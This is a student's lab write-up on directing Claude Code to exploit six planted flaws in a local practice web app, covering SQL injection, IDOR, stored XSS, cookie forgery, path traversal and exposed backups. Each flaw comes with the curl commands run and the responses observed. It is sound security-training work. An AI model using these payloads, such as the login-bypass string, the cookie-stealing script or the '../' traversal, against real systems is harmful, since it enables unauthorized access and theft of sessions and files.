# AI Workflow — How I Directed Claude Code
### INF601 Mini Project 4, Track A (Vuln Hub)

This document records how I (cdmauch) directed Claude Code as an agent while
exploiting the six planted vulnerabilities in the local Vuln Hub target. Each
phase below follows the same loop: I set a goal and gave instructions, Claude
issued the tool calls, the real results were captured (saved under `poc/`) and
shown back to me, and I decided whether to continue. Commands and results shown
are the ones that were actually executed and observed.

**Agent:** Claude Code (Claude Opus). **Target:** local Vuln Hub at
`http://127.0.0.1:5000`, authorized practice target only.

## Overview of Phases 2–7 (the six findings)

Working one finding at a time, with my go-ahead between each:

- **Phase 2 — SQL injection:** bypass the login form with
  `username=admin' -- -`, landing an admin session and reading the SQLi flag on
  the dashboard.
- **Phase 3 — IDOR:** from a normal `alice` session, read admin's `/messages/1`
  (no ownership check) to capture the IDOR flag.
- **Phase 4 — Stored XSS:** post a `<script>…document.cookie…/grab</script>`
  guestbook comment; the simulated admin bot sends its cookie (with the flag) to
  the `/grab` sink.
- **Phase 5 — Broken authorization:** forge the Base64 `username:role` cookie as
  `hacker:superadmin` to reach `/vault` and read the authz flag.
- **Phase 6 — Path traversal:** use `/download?file=../private/employee_notes.txt`
  to escape the `public/` directory and read the traversal flag.
- **Phase 7 — Sensitive data exposure:** recon `/robots.txt`, then download the
  exposed `/backups/vulnhub.sql.bak` to read the exposure flag.

All six flags were read from live HTTP responses (never from local files) and
saved with their evidence under `poc/`.

---

## Phase 2 — Finding 1: SQL injection (login bypass)

**1. Objective and instructions.** Begin the test with SQL injection; proceed on
my go-ahead ("yes, continue").

**2. Tools and commands executed.**
```bash
curl -s -i -c poc/sqli_cookies.txt \
  --data-urlencode "username=admin' -- -" --data-urlencode "password=x" \
  http://127.0.0.1:5000/login
curl -s -b poc/sqli_cookies.txt http://127.0.0.1:5000/dashboard
```

**3. Results observed.** `302 FOUND` → `/dashboard`, `Set-Cookie: auth=YWRtaW46YWRtaW4=`
(Base64 `admin:admin`). Dashboard showed:
`Nice work bypassing the login. FLAG{sqli_d14aa78ca248}`.

**4. What I reviewed/verified.** I reviewed the exact payload, the 302 redirect,
the decoded cookie, and the flag in the live response. The agent saved
`poc/01_sqli.md` and `poc/01_sqli_login_response.txt`.

**5. Changes after unsuccessful attempts.** None — the bypass worked on the first
request. (The agent's initial description mentioned a generic `' OR '1'='1'`
style payload, but the command actually executed and recorded was
`username=admin' -- -`, which selects the admin row directly.)

---

## Phase 3 — Finding 2: IDOR

**1. Objective and instructions.** Continue to IDOR ("yes, continue"): read a
message that isn't the logged-in user's.

**2. Tools and commands executed.**
```bash
curl -s -i -c poc/idor_cookies.txt \
  --data-urlencode "username=alice" --data-urlencode "password=password123" \
  http://127.0.0.1:5000/login
curl -s -b poc/idor_cookies.txt http://127.0.0.1:5000/messages      # lists #4,#5
curl -s -i -b poc/idor_cookies.txt http://127.0.0.1:5000/messages/1 # admin's
```

**3. Results observed.** Logged in as `alice` (cookie `YWxpY2U6dXNlcg==` =
`alice:user`); her message list showed only IDs 4 and 5. `GET /messages/1`
returned `200 OK` with admin's "Onboarding secret":
`Internal only. Do not share. FLAG{idor_25b3a6bacc94}`.

**4. What I reviewed/verified.** I confirmed alice owned only 4–5, yet could read
admin's message #1, and that the flag appeared in the response. Saved
`poc/02_idor.md`, `poc/02_idor_response.txt`.

**5. Changes after unsuccessful attempts.** None.

---

## Phase 4 — Finding 3: Stored XSS

**1. Objective and instructions.** Continue to stored XSS ("yes, continue"):
steal the admin's cookie via the guestbook.

**2. Tools and commands executed.**
```bash
curl -s -i -b poc/idor_cookies.txt \
  --data-urlencode "comment=<script>fetch('/grab?c='+document.cookie)</script>" \
  http://127.0.0.1:5000/guestbook
curl -s http://127.0.0.1:5000/guestbook | grep -i "script"   # confirm unescaped
# then poll the sink until the simulated admin bot fired:
for i in 1..10: curl -s http://127.0.0.1:5000/grab (2s apart)
```

**3. Results observed.** The comment was stored and returned **unescaped** as a
raw `<script>` tag. On the first poll of `/grab`, the simulated admin bot (which
scans comments and makes a server-side request rather than running a browser) had
already sent the admin cookie; the sink recorded:
`c=session=admin; flag=FLAG{xss_d7ddad05744e}`.

**4. What I reviewed/verified.** I verified the payload was stored without
escaping and that the exfiltrated cookie containing the flag reached `/grab`.
Saved `poc/03_xss.md`, `poc/03_xss_grab_response.txt`.

**5. Changes after unsuccessful attempts.** None — the capture succeeded on the
first poll (the bot polls every ~2s).

---

## Phase 5 — Finding 4: Broken authorization

**1. Objective and instructions.** Continue ("continue"): reach `/vault`
(superadmins only) by forging the session cookie.

**2. Tools and commands executed.**
```bash
curl -s -i -b poc/idor_cookies.txt http://127.0.0.1:5000/vault   # baseline (user)
FORGED=$(printf '%s' "hacker:superadmin" | base64)               # aGFja2VyOnN1cGVyYWRtaW4=
curl -s -i --cookie "auth=$FORGED" http://127.0.0.1:5000/vault
```

**3. Results observed.** With role `user`: `403 FORBIDDEN` ("superadmins only").
With the forged `hacker:superadmin` cookie: `200 OK`, "Access granted,
superadmin.", `FLAG{authz_9e92b94b4dde}`.

**4. What I reviewed/verified.** I reviewed the 403 baseline, the decoded forged
cookie, and the 200 with the flag. Saved `poc/04_authz.md`,
`poc/04_authz_response.txt`, `poc/04_forged_cookie.txt`.

**5. Changes after unsuccessful attempts.** None.

---

## Phase 6 — Finding 5: Path traversal

**1. Objective and instructions.** Continue ("continue"): make `/download` serve
a file outside its intended directory.

**2. Tools and commands executed.**
```bash
curl -s -G --data-urlencode "file=welcome.txt" http://127.0.0.1:5000/download     # baseline
curl -s -i -G --data-urlencode "file=../private/employee_notes.txt" \
  http://127.0.0.1:5000/download
```

**3. Results observed.** Baseline returned the intended public welcome file. The
traversal request returned `200 OK` with the confidential sibling file ending in
`FLAG{traversal_0f400e8109b6}`.

**4. What I reviewed/verified.** I confirmed the `../` escape reached the
`private/` directory and returned the flag. Saved `poc/05_traversal.md`,
`poc/05_traversal_response.txt`.

**5. Changes after unsuccessful attempts.** None.

---

## Phase 7 — Finding 6: Sensitive data exposure

**1. Objective and instructions.** Continue ("yes"): find an exposed file,
starting recon at `/robots.txt`.

**2. Tools and commands executed.**
```bash
curl -s http://127.0.0.1:5000/robots.txt
curl -s -i http://127.0.0.1:5000/backups/vulnhub.sql.bak
```

**3. Results observed.** `/robots.txt` disclosed `Disallow: /backups/`.
`GET /backups/vulnhub.sql.bak` returned `200 OK` with a DB backup containing
`INSERT INTO secrets VALUES ('FLAG{exposure_294b6fe0e0bb}');`.

**4. What I reviewed/verified.** I confirmed `robots.txt` leaked the path and the
backup was downloadable without authentication, with the flag in the body. Saved
`poc/06_exposure.md`, `poc/06_exposure_response.txt`.

**5. Changes after unsuccessful attempts.** None.
